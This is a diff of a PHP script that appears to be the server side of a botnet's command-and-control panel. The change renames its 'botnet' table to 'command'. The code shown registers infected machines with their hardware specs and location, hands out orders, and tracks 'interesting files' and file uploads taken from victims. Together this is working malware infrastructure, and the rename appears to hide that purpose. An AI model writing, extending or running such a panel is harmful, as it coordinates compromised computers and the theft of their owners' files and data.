@@ -24,7 +24,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		$longitude   = $coordinates["lon"];
 		$machineID = getValidMachineID();
 		require('connect.php');
-		$stmt        = $conn->prepare("INSERT INTO botnet (`machineID`,`password`,`system`,`programVersion`,`latitude`,`longitude`, `first_signal`, `last_signal`) VALUES (?,?,?,?,?,? , CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)");
+		$stmt        = $conn->prepare("INSERT INTO command (`machineID`,`password`,`system`,`programVersion`,`latitude`,`longitude`, `first_signal`, `last_signal`) VALUES (?,?,?,?,?,? , CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)");
 		$stmt->bind_param("ssssdd", $machineID, hash('sha256', mysqli_real_escape_string($_POST["password"])), $_POST["system"], $_POST["programVersion"], $latitude, $longitude);
 		$stmt->execute();
 		$stmt      = $conn->prepare("INSERT INTO `specs` (`machineID`, `account`, `os`, `language`, `motherboard`, `memory`, `bios`, `cpu`, `gpu`, `audio`, `network`, `harddrives`, `cdrom`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);");
@@ -45,7 +45,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 			$stmt = $conn->prepare("UPDATE specs SET account=?, os=?, language=?, motherboard=?, memory=?, bios=?, cpu=?, gpu=?, audio=?, network=?, harddrives=?, cdrom=? WHERE machineID=?");
 			$stmt->bind_param("sssssssssssss", $_POST["account"], $_POST["os"], $_POST["language"], $_POST["motherboard"], $_POST["memory"], $_POST["bios"], $_POST["cpu"], $_POST["gpu"], $_POST["audio"], $_POST["network"], $_POST["harddrives"], $_POST["cdrom"], $_POST["machineID"]);
 			$stmt->execute();
-			$stmt = $conn->prepare("UPDATE botnet SET inspectHardware=0 WHERE machineID=?");
+			$stmt = $conn->prepare("UPDATE command SET inspectHardware=0 WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
 			require('disconnect.php');
@@ -53,7 +53,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		// Uninstalled
 		elseif ($_POST["operation"] == "uninstalled") {
 			require('connect.php');
-			$stmt = $conn->prepare("DELETE FROM botnet WHERE machineID=?");
+			$stmt = $conn->prepare("DELETE FROM command WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
 			$stmt = $conn->prepare("DELETE FROM specs WHERE machineID=?");
@@ -65,7 +65,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		// Update Status Info
 		elseif ($_POST["operation"] == "updateStatusInfo") {
 			require('connect.php');
-			$stmt = $conn->prepare("UPDATE botnet SET programVersion=?, lat=?, lon=?, last_signal=CURRENT_TIMESTAMP WHERE machineID=?");
+			$stmt = $conn->prepare("UPDATE command SET programVersion=?, lat=?, lon=?, last_signal=CURRENT_TIMESTAMP WHERE machineID=?");
 			$stmt->bind_param("sdds", $_POST["programVersion"], $_POST["lat"], $_POST["lon"], $_POST["machineID"]);
 			$stmt->execute();
 			require('disconnect.php');
@@ -73,7 +73,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		// Get Orders
 		elseif ($_POST["operation"] == "getOrders") {
 			require('connect.php');
-			$stmt = $conn->prepare("SELECT * FROM botnet WHERE machineID=?");
+			$stmt = $conn->prepare("SELECT * FROM command WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
 			$result = $stmt->get_result();
@@ -94,7 +94,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		// Get interesting files
 		elseif ($_POST["operation"] == "getInterestingFiles") {
 			require('connect.php');
-			$stmt = $conn->prepare("SELECT interestingFiles FROM botnet WHERE machineID=?");
+			$stmt = $conn->prepare("SELECT interestingFiles FROM command WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
 			$result = $stmt->get_result();
@@ -106,10 +106,10 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 		// Notify files upload completed
 		elseif ($_POST["operation"] == "notifyFilesUploadCompleted") {
 			require('connect.php');
-			$stmt = $conn->prepare("UPDATE botnet SET filesCapture=0 WHERE machineID=?");
+			$stmt = $conn->prepare("UPDATE command SET filesCapture=0 WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
-			$stmt = $conn->prepare("UPDATE botnet SET interestingFiles='' WHERE machineID=?");
+			$stmt = $conn->prepare("UPDATE command SET interestingFiles='' WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
 			require('disconnect.php');
@@ -121,7 +121,7 @@ if (isset($_POST["key"]) && checkKey($_POST["key"]) && isset($_POST["operation"]
 			$filesPath = "/machines/" . $_POST['machineID'] . "/files/";
 			recursiveMakeDir("", $filesPath);
 
-			$stmt = $conn->prepare("UPDATE botnet SET inspectFiles=0 WHERE machineID=?");
+			$stmt = $conn->prepare("UPDATE command SET inspectFiles=0 WHERE machineID=?");
 			$stmt->bind_param("s", $_POST["machineID"]);
 			$stmt->execute();
 			require('disconnect.php');
